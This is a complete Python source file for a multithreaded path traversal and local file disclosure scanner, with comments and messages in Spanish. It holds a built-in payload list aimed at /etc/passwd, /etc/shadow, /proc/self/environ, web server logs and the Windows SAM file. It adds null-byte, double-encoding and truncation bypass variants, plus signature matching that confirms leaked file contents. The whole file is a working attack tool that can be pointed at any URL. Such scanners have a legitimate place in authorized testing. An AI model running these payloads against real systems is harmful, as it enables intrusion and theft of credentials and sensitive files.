#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""tool-lfdscanner v2.0 – Advanced Local File Disclosure & Path Traversal Scanner

- Enhanced payload library (Unix, Windows, encoding variations)
- Smart content detection with pattern matching
- Response size differential analysis
- Rate limiting and retry logic
- Comprehensive JSON reporting
- Support for authentication headers
- Base64 and URL encoding bypass attempts
"""

import argparse
import base64
import json
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Dict, Optional, Set

import requests
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)


@dataclass
class ScanConfig:
    url: Optional[str] = None
    url_list: Optional[str] = None
    paths_file: Optional[str] = None
    param: str = "file"
    timeout: int = 5
    threads: int = 10
    user_agent: str = "Mozilla/5.0 (compatible; tool-lfdscanner/2.0)"
    auth_header: Optional[str] = None
    insecure: bool = False
    json_output: Optional[str] = None
    verbose: bool = False
    rate_limit: int = 20
    encoding_bypass: bool = False


@dataclass
class Finding:
    url: str
    payload: str
    encoding: str
    status_code: int
    response_size: int
    evidence: str
    confidence: str  # high, medium, low
    timestamp: float


class LFDScanner:
    
    # Enhanced traversal payloads
    DEFAULT_PATHS = [
        # Unix/Linux - /etc/passwd
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        
        # Unix/Linux - /etc/shadow (high value)
        "../../../etc/shadow",
        "../../../../etc/shadow",
        
        # Unix/Linux - otros archivos sensibles
        "../../etc/hosts",
        "../../../etc/hosts",
        "../../etc/hostname",
        "../../etc/issue",
        "../../proc/self/environ",
        "../../proc/version",
        "../../var/log/auth.log",
        "../../var/log/apache2/access.log",
        "../../var/log/nginx/access.log",
        
        # Windows
        "../../windows/win.ini",
        "../../../windows/win.ini",
        "../../../../windows/win.ini",
        "../../windows/system.ini",
        "../../windows/system32/drivers/etc/hosts",
        "../../../windows/system32/drivers/etc/hosts",
        "../../boot.ini",
        "../../../boot.ini",
        "../../windows/system32/config/sam",
        
        # Absolute paths (some servers allow)
        "/etc/passwd",
        "/etc/shadow",
        "C:/windows/win.ini",
        "C:/windows/system32/drivers/etc/hosts",
        
        # Null byte bypass (legacy)
        "../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        
        # Double encoding
        "..%252f..%252fetc%252fpasswd",
        
        # Dot truncation
        "../../etc/passwd.........",
        "../../etc/passwd/.",
    ]
    
    # Signature patterns for detection
    UNIX_SIGNATURES = [
        "root:x:0:0:",
        "daemon:x:",
        "/bin/bash",
        "/bin/sh",
        ":/home/",
        ":/usr/sbin/",
        "nobody:x:",
    ]
    
    SHADOW_SIGNATURES = [
        "$6$",  # SHA-512
        "$5$",  # SHA-256
        "$1$",  # MD5
        "root:!:",
        "::",
    ]
    
    WIN_SIGNATURES = [
        "[extensions]",
        "[fonts]",
        "[files]",
        "for 16-bit app support",
        "C:\\WINDOWS",
        "[MCI Extensions]",
    ]
    
    LOG_SIGNATURES = [
        "GET /",
        "POST /",
        "HTTP/1.1",
        "User-Agent:",
        "Mozilla/",
    ]
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.findings: List[Finding] = []
        self.session = requests.Session()
        self._setup_session()
        self.baseline_sizes: Dict[str, int] = {}
    
    def _setup_session(self):
        headers = {"User-Agent": self.config.user_agent}
        if self.config.auth_header:
            key, value = self.config.auth_header.split(":", 1)
            headers[key.strip()] = value.strip()
        self.session.headers.update(headers)
    
    def log_info(self, msg: str):
        print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")
    
    def log_warn(self, msg: str):
        print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")
    
    def log_error(self, msg: str):
        print(f"{Fore.RED}[x] {msg}{Style.RESET_ALL}")
    
    def log_verbose(self, msg: str):
        if self.config.verbose:
            print(f"{Fore.CYAN}[~] {msg}{Style.RESET_ALL}")
    
    def log_vuln(self, msg: str):
        print(f"{Fore.RED}[!] VULNERABLE:{Style.RESET_ALL} {msg}")
    
    def build_targets(self) -> List[str]:
        targets = []
        
        if self.config.url:
            targets.append(self.config.url.strip())
        
        if self.config.url_list:
            try:
                with open(self.config.url_list, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            targets.append(line)
            except OSError as e:
                self.log_error(f"Error leyendo lista de URLs: {e}")
                sys.exit(1)
        
        # Normalize URLs
        clean = []
        for t in targets:
            t = t.strip()
            if not t:
                continue
            if not t.startswith(("http://", "https://")):
                t = "http://" + t
            clean.append(t)
        
        if not clean:
            self.log_error("No se proporcionaron objetivos válidos")
            sys.exit(1)
        
        return list(dict.fromkeys(clean))
    
    def load_paths(self) -> List[str]:
        paths = list(self.DEFAULT_PATHS)
        
        if self.config.paths_file:
            try:
                with open(self.config.paths_file, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            paths.append(line)
            except OSError as e:
                self.log_error(f"Error leyendo archivo de paths: {e}")
        
        return list(dict.fromkeys(paths))
    
    def build_url(self, base: str, payload: str) -> str:
        if "FUZZ" in base:
            return base.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        
        parsed = urllib.parse.urlparse(base)
        query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        query[self.config.param] = payload
        
        new_query = urllib.parse.urlencode(query, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        if encoding == "url":
            return urllib.parse.quote(payload, safe="")
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def detect_content(self, text: str) -> tuple[bool, str, str]:
        """Returns (is_interesting, evidence, confidence)"""
        snippet = text[:5000]
        
        # Check for /etc/passwd
        for sig in self.UNIX_SIGNATURES:
            if sig in snippet:
                return True, f"Archivo Unix detectado: {sig}", "high"
        
        # Check for /etc/shadow
        for sig in self.SHADOW_SIGNATURES:
            if sig in snippet:
                return True, f"Archivo /etc/shadow detectado: {sig}", "high"
        
        # Check for Windows files
        for sig in self.WIN_SIGNATURES:
            if sig in snippet:
                return True, f"Archivo Windows detectado: {sig}", "high"
        
        # Check for log files
        log_count = sum(1 for sig in self.LOG_SIGNATURES if sig in snippet)
        if log_count >= 2:
            return True, f"Archivo de log detectado ({log_count} patrones)", "medium"
        
        # Heuristic: file looks like system file
        if "root:" in snippet and "/bin" in snippet:
            return True, "Posible archivo de sistema (heurística)", "medium"
        
        return False, "", "low"
    
    def get_baseline(self, base_url: str) -> Optional[int]:
        """Get baseline response size for differential analysis"""
        if base_url in self.baseline_sizes:
            return self.baseline_sizes[base_url]
        
        try:
            # Request with non-existent file
            test_url = self.build_url(base_url, "nonexistent_file_12345.txt")
            resp = self.session.get(
                test_url,
                timeout=self.config.timeout,
                verify=not self.config.insecure
            )
            self.baseline_sizes[base_url] = len(resp.text)
            return len(resp.text)
        except requests.RequestException:
            return None
    
    def scan_single_request(self, url: str, payload: str, encoding: str = "none") -> Optional[Finding]:
        try:
            resp = self.session.get(
                url,
                timeout=self.config.timeout,
                verify=not self.config.insecure,
                allow_redirects=True
            )
            
            self.log_verbose(f"{url} → {resp.status_code}")
            
            # Check status codes
            if resp.status_code not in (200, 206, 500, 403):
                return None
            
            # Content detection
            is_interesting, evidence, confidence = self.detect_content(resp.text)
            
            if is_interesting:
                finding = Finding(
                    url=url,
                    payload=payload,
                    encoding=encoding,
                    status_code=resp.status_code,
                    response_size=len(resp.text),
                    evidence=evidence,
                    confidence=confidence,
                    timestamp=time.time()
                )
                
                snippet = resp.text[:200].replace("\n", " ").replace("\r", " ")
                self.log_vuln(f"{url}")
                print(f"    Payload: {payload}")
                print(f"    Encoding: {encoding}")
                print(f"    Status: {resp.status_code}")
                print(f"    Confidence: {confidence}")
                print(f"    Evidence: {evidence}")
                print(f"    Snippet: {snippet}\n")
                
                return finding
            
            time.sleep(1 / self.config.rate_limit)
            
        except requests.RequestException as e:
            self.log_verbose(f"Error: {e}")
        
        return None
    
    def scan_target(self, base_url: str, paths: List[str]) -> List[Finding]:
        findings = []
        
        # Get baseline
        baseline = self.get_baseline(base_url)
        if baseline:
            self.log_verbose(f"Baseline response size: {baseline} bytes")
        
        encodings = ["none"]
        if self.config.encoding_bypass:
            encodings.extend(["url", "double_url"])
        
        tasks = []
        for path in paths:
            for encoding in encodings:
                encoded_payload = self.encode_payload(path, encoding)
                final_url = self.build_url(base_url, encoded_payload)
                tasks.append((final_url, path, encoding))
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [
                executor.submit(self.scan_single_request, url, payload, encoding)
                for url, payload, encoding in tasks
            ]
            
            for future in tqdm(
                as_completed(futures),
                total=len(tasks),
                desc=f"Escaneando {base_url}",
                unit="req"
            ):
                result = future.result()
                if result:
                    findings.append(result)
        
        return findings
    
    def scan(self) -> Dict:
        """Main scan routine"""
        print(f"{Fore.CYAN}╭────────────────────────────────────────────────╮{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│  tool-lfdscanner v2.0 - LFD/Path Traversal  │{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╰────────────────────────────────────────────────╯{Style.RESET_ALL}\n")
        
        targets = self.build_targets()
        paths = self.load_paths()
        
        self.log_info(f"Objetivos cargados: {len(targets)}")
        self.log_info(f"Payloads cargados: {len(paths)}")
        
        all_findings = {}
        
        for target in targets:
            self.log_info(f"Escaneando: {target}")
            findings = self.scan_target(target, paths)
            all_findings[target] = findings
        
        return self.generate_report(all_findings, targets)
    
    def generate_report(self, all_findings: Dict, targets: List[str]) -> Dict:
        """Generate comprehensive report"""
        total_vulns = sum(len(v) for v in all_findings.values())
        
        print("\n" + "="*60)
        self.log_info("Escaneo completado")
        print(f"    Objetivos analizados: {len(targets)}")
        print(f"    Vulnerabilidades encontradas: {total_vulns}")
        
        # Confidence breakdown
        confidence_count = {"high": 0, "medium": 0, "low": 0}
        for findings in all_findings.values():
            for f in findings:
                confidence_count[f.confidence] = confidence_count.get(f.confidence, 0) + 1
        
        if total_vulns > 0:
            print(f"\n    Por confianza:")
            print(f"      - {Fore.RED}High{Style.RESET_ALL}: {confidence_count['high']}")
            print(f"      - {Fore.YELLOW}Medium{Style.RESET_ALL}: {confidence_count['medium']}")
            print(f"      - {Fore.CYAN}Low{Style.RESET_ALL}: {confidence_count['low']}")
        
        report = {
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "scanner_version": "2.0",
            "targets_scanned": len(targets),
            "vulnerabilities_found": total_vulns,
            "confidence_summary": confidence_count,
            "findings": {
                target: [asdict(f) for f in findings]
                for target, findings in all_findings.items()
            }
        }
        
        return report
    
    def export_json(self, report: Dict):
        """Export report to JSON"""
        if not self.config.json_output:
            return
        
        try:
            with open(self.config.json_output, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.log_info(f"Resultados guardados en {self.config.json_output}")
        except OSError as e:
            self.log_error(f"Error guardando JSON: {e}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="tool-lfdscanner v2.0 – Advanced LFD & Path Traversal Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-u", "--url", help="URL objetivo (puede contener FUZZ)")
    parser.add_argument("-L", "--list", help="Archivo con lista de URLs")
    parser.add_argument("--paths", help="Archivo con paths personalizados")
    parser.add_argument("-p", "--param", default="file", help="Parámetro a inyectar (default: file)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout en segundos (default: 5)")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Número de threads (default: 10)")
    parser.add_argument("-A", "--agent", help="User-Agent personalizado")
    parser.add_argument("--auth-header", help="Header de autenticación (ej: 'Authorization: Bearer token')")
    parser.add_argument("--insecure", action="store_true", help="Desactivar verificación TLS")
    parser.add_argument("--rate-limit", type=int, default=20, help="Peticiones por segundo (default: 20)")
    parser.add_argument("--encoding-bypass", action="store_true", help="Intentar bypass con encoding (URL, double URL)")
    parser.add_argument("-o", "--json-output", help="Guardar resultados en JSON")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    
    args = parser.parse_args()
    
    if not args.url and not args.list:
        parser.error("Debes proporcionar --url o --list")
    
    return args


def main():
    args = parse_args()
    
    config = ScanConfig(
        url=args.url,
        url_list=args.list,
        paths_file=args.paths,
        param=args.param,
        timeout=args.timeout,
        threads=args.threads,
        user_agent=args.agent or "Mozilla/5.0 (compatible; tool-lfdscanner/2.0)",
        auth_header=args.auth_header,
        insecure=args.insecure,
        json_output=args.json_output,
        verbose=args.verbose,
        rate_limit=args.rate_limit,
        encoding_bypass=args.encoding_bypass
    )
    
    scanner = LFDScanner(config)
    
    try:
        report = scanner.scan()
        scanner.export_json(report)
    except KeyboardInterrupt:
        scanner.log_warn("Interrumpido por el usuario")
        sys.exit(1)


if __name__ == "__main__":
    main()
